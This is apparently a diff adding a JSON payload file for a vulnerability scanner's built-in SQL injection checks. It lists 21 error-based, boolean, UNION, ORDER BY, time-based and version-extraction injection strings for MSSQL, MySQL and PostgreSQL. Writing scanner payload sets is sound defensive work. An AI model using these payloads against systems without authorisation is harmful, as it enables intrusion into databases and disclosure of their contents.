@@ -1,0 +1,26 @@
+{
+  "description": "SQL Injection payloads for built-in vulnerability scanning",
+  "payloads": [
+    { "payload": "'", "type": "error-based (single quote)" },
+    { "payload": "\"", "type": "error-based (double quote)" },
+    { "payload": ")'", "type": "error-based (closing paren quote)" },
+    { "payload": "')\"", "type": "error-based (compound closing)" },
+    { "payload": "' OR '1'='1", "type": "boolean-based (OR tautology)" },
+    { "payload": "' OR '1'='1' -- ", "type": "boolean-based (OR tautology comment)" },
+    { "payload": "\" OR \"1\"=\"1", "type": "boolean-based (double quote OR)" },
+    { "payload": "1 OR 1=1", "type": "boolean-based (numeric OR)" },
+    { "payload": "' AND '1'='1", "type": "boolean-based (AND tautology)" },
+    { "payload": "' AND '1'='2", "type": "boolean-based (AND false)" },
+    { "payload": "' UNION SELECT NULL-- ", "type": "UNION-based (single NULL)" },
+    { "payload": "' UNION SELECT NULL,NULL-- ", "type": "UNION-based (double NULL)" },
+    { "payload": "' UNION SELECT NULL,NULL,NULL-- ", "type": "UNION-based (triple NULL)" },
+    { "payload": "1' ORDER BY 10-- ", "type": "ORDER BY probing" },
+    { "payload": "1; WAITFOR DELAY '0:0:3'-- ", "type": "time-based MSSQL" },
+    { "payload": "1' AND SLEEP(3)-- ", "type": "time-based MySQL" },
+    { "payload": "1' AND pg_sleep(3)-- ", "type": "time-based PostgreSQL" },
+    { "payload": "1' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)-- ", "type": "time-based MySQL complex" },
+    { "payload": "' AND 1=CONVERT(int,(SELECT @@version))-- ", "type": "error-based MSSQL version" },
+    { "payload": "' AND extractvalue(1,concat(0x7e,version()))-- ", "type": "error-based MySQL extractvalue" },
+    { "payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,VERSION(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ", "type": "error-based MySQL complex" }
+  ]
+}
